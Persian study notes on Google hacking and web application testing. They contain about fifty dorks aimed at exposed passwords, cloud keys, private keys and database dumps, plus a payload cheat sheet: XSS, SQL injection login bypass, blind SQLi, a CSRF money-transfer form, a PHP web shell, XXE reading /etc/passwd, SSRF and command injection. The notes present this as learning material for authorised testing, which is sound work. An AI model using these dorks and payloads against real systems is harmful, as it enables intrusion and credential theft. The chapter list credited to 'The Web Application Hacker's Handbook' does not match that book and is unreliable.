# google hacking


### Google Hacking for Penetration Testers

۱) خلاصهٔ کوتاه — ایدهٔ مرکزی کتاب

کتاب نشان می‌دهد چطور موتورهای جستجو (به‌ویژه گوگل) با اپراتورهای پیشرفته می‌توانند اطلاعات حساسِ «منتشرشده» یا «اشتباهاً در دسترس» را پیدا کنند: فایل‌های پیکربندی، بکاپ‌ها، صفحات لاگ، credentialها، پنل‌های ادمین و غیره. هدف کتاب این است که پنتسترها و ادمین‌ها قبل از مهاجمین این اطلاعات را بیابند و پاک/ایمن کنند. نسخه‌ها و ویرایش‌های متعدد (Volume/Edition) محتوا را بسط می‌دهند و مثال‌های عملی و GHDB را پوشش می‌دهند. 


۲) فصل‌ها / بخش‌های کلیدی که باید بخوانی (عملی و سریع)

(ترتیب و عنوان‌ها در ویرایش‌ها ممکن است فرق کند — این فهرست مفهومی است)

مقدمه و فلسفهٔ «Google Hacking» — چرا گوگل ابزار قدرتمندی برای کشف اطلاعات حساس است. 
```

اپراتورهای پایه و پیشرفتهٔ گوگل (site:, inurl:, intitle:, filetype:, intext:, cache:, allinurl:, allintitle: و ترکیبات Boolean).
```
blackhat.com

ساخت دُرک‌های مؤثر و ترکیبِ Boolean + فیلترها (مثال‌های عملی). 


GHDB — Google Hacking Database: ساختار، دسته‌بندی و نحوه استفاده‌ٔ عملی در reconnaissance. 


سناریوهای واقعی: یافتن فایل‌های پیکربندی، صفحات backup، صفحات لاگ، فایل‌های SQL/XLS حاوی credentials. 


قوانین اخلاقی و راهکار remediation — چگونه یافته‌ها را گزارش دهی و چه کارهایی باید انجام شود. 


۳) ابزارها و منابع عملی که در کتاب/اکوسیستم مرتبط استفاده می‌شوند

این ابزارها را کتاب یا منابع مکمل (GHDB / سخنرانی‌های Johnny Long) معرفی یا به‌عنوان تکمیل‌کنندهٔ گوگل‌هکینگ پیشنهاد می‌کنند:

Google Hacking Database (GHDB) — دیتابیس دُرک‌ها (مهم‌ترین مرجع عملی). 


theHarvester — جمع‌آوری ایمیل و subdomain که مکمل دُرک‌هاست.

Maltego — گراف‌سازی روابط و تجمیع اطلاعات OSINT.

Shodan / Censys — جستجوی سرویس‌ها و دستگاه‌هایی که گوگل پوشش نمی‌دهد.

waybackurls / gau — آرشیوِ صفحات قدیمی که ممکن است اطلاعات حساس قدیمی را نشان دهند.

ツールهای عمومی پنتست: Nmap, Burp Suite, SQLMap (برای قدم بعدی پس از کشف) — برای تأیید و exploitation محتمل.
(توضیح: GHDB/مقاله‌ها و سخنرانی‌ها فهرست ابزارها و مثال‌ها را تکمیل می‌کنند). 


۴) چک‌لیست/دُرک‌های پرکاربرد — سریع اجرا کن (مثال‌ها)

این‌ها مثال‌های عملی که در کتاب و GHDB بارها دیده می‌شوند. فقط روی دامنه‌ای که اجازه داری اجرا کن!

صفحات ادمین / لاگین:
```
site:target.com inurl:admin OR inurl:login
```

فایلهـای پیکربندی (.env, .ini):
```
site:target.com filetype:env OR filetype:ini "DB_PASSWORD" OR "DB_USER"
```

directory listing / بکاپ:
```
site:target.com "index of" "backup"
```

فایل‌های SQL یا export حاوی پسورد:
```
site:target.com filetype:sql "password" OR "credential"
```

لاگ یا فایل متنی شامل واژهٔ password:
```
filetype:log intext:password site:target.com
```

برای فهرست دسته‌بندی‌شده و صدها دُرک آماده، از GHDB استفاده کن. 


۵) منابع مستقیم / لینک‌های دانلود و خرید (پیشنهاد شده)

GHDB (Google Hacking Database) — مرجع آنلاین دُرک‌ها (Exploit-DB). 


BlackHat presentation (Johnny Long) — اسلاید/پی‌دی‌اف معرفی و مثال‌های عملی (منبع سخنرانی مفید). 


Google Hacking for Penetration Testers — صفحات کتاب در Google Books / خرید از فروشگاه‌ها (Amazon / Kobo). 


سخنرانی DEFCON / ویدئوهای Johnny Long — ویدئوها و کانفرانس‌ها برای دیدن demoها. 



۶) چطور شروع کنی — مسیر عملی در ۵ گام

خواندن سریع فصل اپراتورها (کتاب یا cheat-sheet) تا اپراتورهای مهم را بلد باشی. 


مرور GHDB و برداشتن ۲۰-۳۰ دُرک مرتبط با حوزهٔ هدف (شغلی/دامنهٔ مشتری). 


اجرای passive recon: waybackurls/gau + GHDB queries (یا Google CSE/Bing API اگر می‌خواهی خودکار و قانونی). 


فیلتر، triage و تأیید دستی: آنچه واقعی است را با مرورگر، curl و ابزارهای پنتست مثل Burp بررسی کن.

گزارش و remediation: نتایج حساس را به مالک اطلاع بده و راهکار پاک‌سازی پیشنهاد کن (remove/robots, auth, folder permissions).

۷) منابع تکمیلی و آموزشی آنلاین (برای به‌روز ماندن)

Exploit-DB GHDB (برای سرچ دُرک‌ها). 
مقالات و بلاگ‌های امنیت / Recorded Future — توضیحات و موارد جدید دُرک. 
ویدئوهای DEFCON / BlackHat از سخنرانان (Johnny Long) — demoها و روش‌ها. 

---

### Google Hacking Database (GHDB)

ابزارها و پروژه‌های کمکی (برای خواندن GHDB و اتوماسیون)

صفحه رسمی GHDB در Exploit-DB — نقطهٔ شروع و مرجع اصلی. 


آینه‌ها / گیت‌هاب: چند repo فهرست دُرک‌ها را mirror یا بصورت CSV/JSON نگهداری می‌کنند (مثلاً GitHub projects). 


Pagodo / google-dorks-scanner / ghdb tools — ابزارهای پایتونی/بش که می‌توانند GHDB را گرفته و برای یک دامنه اجرا کنند (اتوماسیون); توجه به نرخ/قوانین و APIها ضروری است. 


ابزارهای مکمل reconnaissance: theHarvester, amass, waybackurls, shodan, censys — نتیجهٔ GHDB را با اینها ترکیب کن. 


مثال‌های پراستفاده (دُرک‌ها — فقط برای دامنه‌ای که اجازه داری)

پیداکردن پنل مدیریت:
```
site:target.com inurl:admin OR inurl:login
```

فایل‌های env/پیکربندی حاوی پسورد:
```
site:target.com filetype:env OR filetype:ini "DB_PASSWORD"
```

directory listing / backup:
```
site:target.com "index of" "backup"
```

فایل‌های SQL یا export با credential:
```
site:target.com filetype:sql "password" OR "credential"
```


---

### DORKS LIST — 50 Google Dorks (GHDB-style)

———- Information Gathering / Admin Panels ———-
```
site:{domain} inurl:admin OR inurl:login site:{domain} inurl:dashboard site:{domain} intitle:“admin” OR intitle:“login” site:{domain} inurl:“wp-admin” site:{domain} inurl:phpmyadmin
```

———- Configuration / Environment Files ———-
```
site:{domain} filetype:env OR filetype:ini site:{domain} filetype:conf OR filetype:cnf site:{domain} “DB_PASSWORD” OR “DB_USER” OR “DB_HOST” site:{domain} filetype:properties “password”
```

———- Backup / Archive / Indexes ———-
```
site:{domain} “index of” “backup” site:{domain} “index of” “dump” site:{domain} ext:zip OR ext:tar OR ext:gz “backup” site:{domain} filetype:sql “dump”
```

———- Credentials & Secrets ———-
```
site:{domain} intext:“password” filetype:txt site:{domain} filetype:log “password” site:{domain} “aws_access_key_id” OR “aws_secret_access_key” site:{domain} “BEGIN RSA PRIVATE KEY” site:{domain} “private key” ext:pem
```

———- Database / SQL Dumps ———-
```
site:{domain} filetype:sql “INSERT INTO” site:{domain} filetype:sql “password” site:{domain} filetype:db OR filetype:sqlite site:{domain} “mysqldump” OR “pg_dump”
```

———- Source Code Repos & Config Exposures ———-
```
site:{domain} inurl:.git site:{domain} inurl:.svn site:{domain} inurl:.hg site:{domain} “composer.json” “require”
```
———- Web App Specific: WordPress / Plugins ———-
```
site:{domain} inurl:wp-content/uploads filetype:php site:{domain} “wp-config.php” “DB_PASSWORD” site:{domain} inurl:wp-content/plugins filetype:php site:{domain} “Powered by WordPress” “plugin”
```

———- PHP / Debug / Info Pages ———-
```
site:{domain} intitle:“phpinfo()” “PHP Version” site:{domain} intext:“phpinfo()” filetype:php site:{domain} intext:“mysqli_connect(” OR “mysql_connect(” site:{domain} “Warning: mysql_” “on line”
```

———- File Uploads / Open Uploads ———-
```
site:{domain} inurl:uploads filetype:php site:{domain} inurl:upload filetype:jpg OR filetype:php site:{domain} “Index of” “/uploads/”
```

———- Error Messages / Debug Output ———-
```
site:{domain} “Stacktrace” OR “Exception in thread” site:{domain} “Fatal error” “on line” site:{domain} “Warning: include” “failed”
```

———- Admin Panels / Common Services ———-
```
site:{domain} inurl:phpinfo.php OR inurl:phpinfo site:{domain} inurl:manager/html (Tomcat manager) site:{domain} inurl:solr/admin (Solr admin)
```

———- Exposed Devices / Cameras / Routers ———-
```
site:{domain} “webcamxp” OR “NetWave” OR “IPCamera” site:{domain} “router” “admin” “password”
```

———- Miscellaneous Sensitive Files ———-
```
site:{domain} filetype:pdf “password” OR “credential” site:{domain} filetype:xls OR filetype:xlsx “password” site:{domain} filetype:doc OR filetype:docx “password” site:{domain} “ssh_host_rsa_key” OR “sshd_config”
```

———- Useful Generic GHDB Patterns ———-
```
site:{domain} “index of” “.git” site:{domain} “index of” “.env” site:{domain} “index of” “config”
```


---

### The Web Application Hacker’s Handbook

فصل 1: Introduction to Web Hacking

موضوع: مبانی امنیت وب، HTTP، مرورگرها، ساختار وب‌اپلیکیشن‌ها.

نمونه آسیب‌پذیری: معمولاً هنوز چیزی نفوذپذیر نیست، اما فهم نحوه ارسال درخواست و پاسخ HTTP پایه است.

روش کشف: با intercept کردن ترافیک HTTP/HTTPS از طریق Burp Suite یا OWASP ZAP.

پیلود نمونه: -

مثال: مشاهده درخواست ورود (POST) و پاسخ سرور هنگام نام کاربری/رمز اشتباه.

فصل 2: Information Gathering

موضوع: جمع‌آوری اطلاعات برای نفوذ: دامنه‌ها، سرورها، ورژن‌ها.

نمونه آسیب‌پذیری: سرورهای قدیمی با CVE شناخته‌شده.

روش کشف:
```
Subdomain enumeration: sublist3r, amass

Banner grabbing: curl -I http://example.com
```
پیلود نمونه: -

مثال: curl -I http://example.com جواب می‌دهد: Server: Apache/2.4.49 → CVE 2021-41773 (path traversal) قابل بررسی است.

فصل 3: Mapping the Application

موضوع: فهم صفحات و مسیرها، پارامترها، عملکرد.

نمونه آسیب‌پذیری: صفحات مدیریت مخفی بدون احراز هویت.

روش کشف: Crawling اتوماتیک با Burp Spider، یا ابزارهایی مثل gobuster.

پیلود نمونه: -

مثال: gobuster dir -u http://example.com -w common.txt → /admin پیدا می‌شود.

فصل 4: Input Validation Vulnerabilities

موضوع: XSS، SQLi، Command Injection.

نمونه آسیب‌پذیری: Reflected XSS.

روش کشف: دستکاری پارامترهای GET/POST.

پیلود نمونه:
```
<script>alert('XSS')</script>
```

مثال: http://example.com/search?q=<script>alert('XSS')</script> → اگر هشدار نمایش داده شد، آسیب‌پذیر است.

فصل 5: Broken Authentication

موضوع: حملات login، session hijacking، brute force.

نمونه آسیب‌پذیری: Credential stuffing.

روش کشف: تست با ترکیب نام‌کاربری/رمز عبور از داده‌های افشا شده.

پیلود نمونه: admin:admin123

مثال: با Burp Intruder تست می‌کنیم و موفق به ورود غیرمجاز می‌شویم.

فصل 6: Session Management

موضوع: کوکی‌ها، توکن‌ها، Session Fixation.

نمونه آسیب‌پذیری: Session ID قابل حدس.

روش کشف: بررسی طول و الگوی Session ID.

پیلود نمونه: تغییر آخرین کاراکتر Session ID در کوکی.

مثال: PHPSESSID=abcd1234 → PHPSESSID=abcd1235 → اگر هنوز کار می‌کند، آسیب‌پذیر است.

فصل 7: Access Control

موضوع: IDOR، Privilege Escalation.

نمونه آسیب‌پذیری: IDOR در تغییر پروفایل کاربر.

روش کشف: تغییر شناسه کاربر در URL/پارامتر POST.

پیلود نمونه:
```
GET /profile?user_id=123
```

→ تغییر به user_id=124

مثال: اگر اطلاعات کاربر 124 نمایش داده شود، آسیب‌پذیر است.

فصل 8: Injection Flaws

موضوع: SQLi، Command Injection، LDAP Injection.

نمونه آسیب‌پذیری: SQL Injection در فرم جستجو.

روش کشف: تزریق کاراکتر ' و بررسی خطای SQL.

پیلود نمونه:
```
' OR '1'='1
```

مثال: http://example.com/login?user=' OR '1'='1&pass=anything → ورود موفق.

فصل 9: Cross-Site Scripting (XSS)

موضوع: Stored, Reflected, DOM-based XSS.

نمونه آسیب‌پذیری: Stored XSS در فرم کامنت.

روش کشف: ثبت کامنت حاوی <script>alert(1)</script> و مشاهده آن توسط کاربر دیگر.

پیلود نمونه: همان <script>alert(1)</script>

مثال: ارسال کامنت → نمایش اسکریپت در صفحه.

فصل 10: Cross-Site Request Forgery (CSRF)

موضوع: حملات CSRF و جلوگیری.

نمونه آسیب‌پذیری: انتقال پول بدون احراز هویت مجدد.

روش کشف: ایجاد فرم HTML که درخواست POST را بدون توکن CSRF ارسال کند.

پیلود نمونه:
```
<form action="http://example.com/transfer" method="POST">
    <input type="hidden" name="amount" value="1000">
    <input type="hidden" name="to" value="attacker">
</form>
<script>document.forms[0].submit()</script>
```

مثال: اگر انتقال موفق باشد، آسیب‌پذیر است.


فصل 11: File Handling Vulnerabilities

موضوع: File upload، LFI، RFI، Path Traversal.

نمونه آسیب‌پذیری: آپلود فایل مخرب بدون محدودیت.

روش کشف: آپلود فایل PHP/Python و اجرای آن.

پیلود نمونه:
```
<?php system($_GET['cmd']); ?>
```

مثال: آپلود shell.php → http://example.com/uploads/shell.php?cmd=ls → اگر محتوا نمایش داده شد، آسیب‌پذیر است.

فصل 12: SQL Injection Advanced

موضوع: Blind SQLi، Time-based، Error-based.

نمونه آسیب‌پذیری: SQLi در فرم جستجو بدون نمایش خطا.

روش کشف: تزریق دستوراتی که زمان پاسخ را تغییر دهند.

پیلود نمونه:
```
' OR IF(SUBSTRING(user(),1,1)='a',SLEEP(5),0) --
```

مثال: اگر پاسخ با ۵ ثانیه تاخیر آمد، SQL Injection تأیید می‌شود.

فصل 13: XML External Entity (XXE)

موضوع: آسیب‌پذیری XML/Parser.

نمونه آسیب‌پذیری: دسترسی به فایل‌های سرور.

روش کشف: تزریق XML با ENTITY خارجی.

پیلود نمونه:
```
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

مثال: پاسخ سرور حاوی /etc/passwd → آسیب‌پذیر است.

فصل 14: Server-Side Request Forgery (SSRF)

موضوع: دسترسی سرور به منابع داخلی.

نمونه آسیب‌پذیری: درخواست سرور به IP داخلی.

روش کشف: تغییر URL در پارامتر که سرور درخواست می‌کند.

پیلود نمونه:
```
http://example.com/fetch?url=http://127.0.0.1/admin
```

مثال: اگر محتوا بازگشت، SSRF تأیید شد.

فصل 15: Command Injection

موضوع: اجرای دستورات سیستم از وب.

نمونه آسیب‌پذیری: فرم ping.

روش کشف: تزریق کاراکترهای خط فرمان.

پیلود نمونه:
```
; ls -la
```

مثال: http://example.com/ping?host=127.0.0.1; ls -la → لیست فایل‌ها برگشت.

فصل 16: Insecure Direct Object References (IDOR)

موضوع: دسترسی غیرمجاز به منابع.

نمونه آسیب‌پذیری: تغییر user_id در URL.

روش کشف: تغییر پارامترهای GET/POST.

پیلود نمونه:
```
GET /invoice?id=101
```

مثال: تغییر به id=102 → اگر فاکتور دیگر کاربر نمایش داده شد، آسیب‌پذیر است.

فصل 17: Cross-Site Script Inclusion (XSSI)

موضوع: دسترسی به داده‌های حساسی که در جاوااسکریپت هستند.

نمونه آسیب‌پذیری: اطلاعات در فایل JS.

روش کشف: بررسی فایل‌های JS و تزریق script.

پیلود نمونه: </script><script>alert(1)</script>

مثال: اطلاعات محرمانه از JS خارج شد.

فصل 18: Web Services Vulnerabilities

موضوع: SOAP/REST API Security.

نمونه آسیب‌پذیری: API بدون احراز هویت.

روش کشف: تست endpoint ها با Postman.

پیلود نمونه: GET /api/users/1 بدون توکن → اطلاعات کاربر بازگشت.

مثال: API دسترسی آزاد به دیتابیس.

فصل 19: Authentication and Authorization Flaws in APIs

موضوع: JWT، OAuth، API key.

نمونه آسیب‌پذیری: JWT بدون اعتبارسنجی signature.

روش کشف: تغییر payload JWT.

پیلود نمونه:
```
{"user":"admin"}
```

مثال: جایگزینی JWT → دسترسی admin بدون رمز عبور.

فصل 20: Attacking Application Logic

موضوع: خطاهای منطقی وب‌اپ.

نمونه آسیب‌پذیری: دور زدن محدودیت‌های تراکنش.

روش کشف: تکرار یا تغییر درخواست‌ها.

پیلود نمونه: تغییر quantity=1 → quantity=100

مثال: قیمت کاهش نیافت → Logic flaw.

فصل 21: Security Misconfiguration

موضوع: فایل‌های غیرقابل دسترسی، سرورهای باز.

نمونه آسیب‌پذیری: فهرست دایرکتوری باز.

روش کشف: دسترسی مستقیم به مسیرها.

پیلود نمونه: http://example.com/uploads/

مثال: مشاهده لیست فایل‌ها → آسیب‌پذیر است.

فصل 22: Sensitive Data Exposure

موضوع: افشای اطلاعات رمزگذاری نشده.

نمونه آسیب‌پذیری: داده‌های حساس در HTTPS غیرفعال.

روش کشف: مانیتور ترافیک HTTP.

پیلود نمونه: -

مثال: درخواست POST حاوی password=1234 در HTTP → آسیب‌پذیر است.

فصل 23: Using Components with Known Vulnerabilities

موضوع: کتابخانه‌ها و پکیج‌های آسیب‌پذیر.

نمونه آسیب‌پذیری: Apache Struts با CVE شناخته شده.

روش کشف: بررسی نسخه‌ها.

پیلود نمونه: -

مثال: نسخه آسیب‌پذیر در header: Server: Apache-Coyote/1.1 → Exploit موجود.

فصل 24: Insufficient Logging & Monitoring

موضوع: عدم گزارش‌دهی نفوذها.

نمونه آسیب‌پذیری: نفوذ بدون ردپا.

روش کشف: انجام تست و بررسی لاگ سرور.

پیلود نمونه: -

مثال: دسترسی غیرمجاز بدون هیچ log در سیستم → مشکل امنیتی.

فصل 25: Web Application Security Testing

موضوع: جمع‌بندی، تست کامل وب‌اپلیکیشن.

نمونه آسیب‌پذیری: همه موارد بالا.

روش کشف: اجرای تست ترکیبی با Burp Suite، OWASP ZAP، و اسکریپت‌های خودکار.

پیلود نمونه: ترکیبی از XSS، SQLi، CSRF، IDOR.

مثال: اجرای اسکن جامع → گزارش آسیب‌پذیری‌ها به شکل HTML/PDF.

---

| فصل | نوع آسیب‌پذیری | روش کشف | پیلود نمونه | مثال عملی |
|-----|----------------|----------|-------------|------------|
| 1 | مبانی وب | بررسی ترافیک HTTP/HTTPS | - | مشاهده درخواست ورود و پاسخ سرور |
| 2 | اطلاعات سرور و دامنه | Subdomain enumeration، Banner grabbing | - | `curl -I http://example.com` → `Server: Apache/2.4.49` |
| 3 | نقشه‌برداری اپلیکیشن | Crawling با Burp Spider یا gobuster | - | `gobuster dir -u http://example.com -w common.txt` → `/admin` |
| 4 | Input Validation (XSS, SQLi) | تزریق پارامتر GET/POST | `<script>alert('XSS')</script>` | `http://example.com/search?q=<script>alert('XSS')</script>` |
| 5 | Broken Authentication | Brute force، Credential stuffing | `admin:admin123` | ورود غیرمجاز با Burp Intruder |
| 6 | Session Management | بررسی طول و الگوی Session ID | تغییر کاراکتر Session ID | `PHPSESSID=abcd1235` → اگر هنوز کار می‌کند، آسیب‌پذیر است |
| 7 | Access Control (IDOR) | تغییر شناسه کاربر در URL/POST | `GET /profile?user_id=123` | تغییر به `user_id=124` → نمایش اطلاعات کاربر دیگر |
| 8 | SQL Injection | تزریق `'` و بررسی خطای SQL | `' OR '1'='1` | `http://example.com/login?user=' OR '1'='1&pass=anything` → ورود موفق |
| 9 | XSS Stored/Reflected/DOM | ثبت داده حاوی script | `<script>alert(1)</script>` | ارسال کامنت → نمایش اسکریپت در صفحه |
| 10 | CSRF | ایجاد فرم HTML بدون توکن | `<form action="http://example.com/transfer" method="POST"><input type="hidden" name="amount" value="1000"><input type="hidden" name="to" value="attacker"></form><script>document.forms[0].submit()</script>` | اگر انتقال موفق باشد، آسیب‌پذیر است |
| 11 | File Handling (Upload, LFI/RFI) | آپلود فایل مخرب | `<?php system($_GET['cmd']); ?>` | آپلود `shell.php` → `http://example.com/uploads/shell.php?cmd=ls` |
| 12 | Advanced SQLi | Blind/Time-based SQLi | `' OR IF(SUBSTRING(user(),1,1)='a',SLEEP(5),0) --` | پاسخ با ۵ ثانیه تاخیر → آسیب‌پذیر |
| 13 | XXE | تزریق ENTITY خارجی در XML | `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>` | پاسخ سرور حاوی `/etc/passwd` |
| 14 | SSRF | تغییر URL در پارامتر | `http://example.com/fetch?url=http://127.0.0.1/admin` | اگر محتوا بازگشت → آسیب‌پذیر است |
| 15 | Command Injection | تزریق دستورات خط فرمان | `; ls -la` | `http://example.com/ping?host=127.0.0.1; ls -la` → لیست فایل‌ها برگشت |
| 16 | IDOR | تغییر پارامتر GET/POST | `GET /invoice?id=101` | تغییر به `id=102` → مشاهده فاکتور دیگر کاربر |
| 17 | XSSI | دسترسی به داده‌های JS | `</script><script>alert(1)</script>` | اطلاعات محرمانه از فایل JS خارج شد |
| 18 | Web Services Vulnerabilities | تست endpoint API با Postman | `GET /api/users/1` بدون توکن | اطلاعات کاربر بازگشت |
| 19 | API Auth Flaws (JWT/OAuth) | تغییر payload JWT | `{"user":"admin"}` | جایگزینی JWT → دسترسی admin بدون رمز عبور |
| 20 | Application Logic Flaws | تغییر تراکنش‌ها | `quantity=1 → quantity=100` | قیمت کاهش نیافت → Logic flaw |
| 21 | Security Misconfiguration | دسترسی مستقیم مسیرها | `http://example.com/uploads/` | مشاهده لیست فایل‌ها → آسیب‌پذیر است |
| 22 | Sensitive Data Exposure | مانیتور ترافیک HTTP | - | درخواست POST حاوی `password=1234` در HTTP |
| 23 | Using Vulnerable Components | بررسی نسخه‌ها | - | `Server: Apache-Coyote/1.1` → Exploit موجود |
| 24 | Insufficient Logging & Monitoring | بررسی لاگ سرور | - | دسترسی غیرمجاز بدون هیچ log |
| 25 | Web Application Security Testing | همه موارد بالا | ترکیبی از XSS, SQLi, CSRF, IDOR | اجرای اسکن جامع → گزارش HTML/PDF |

---

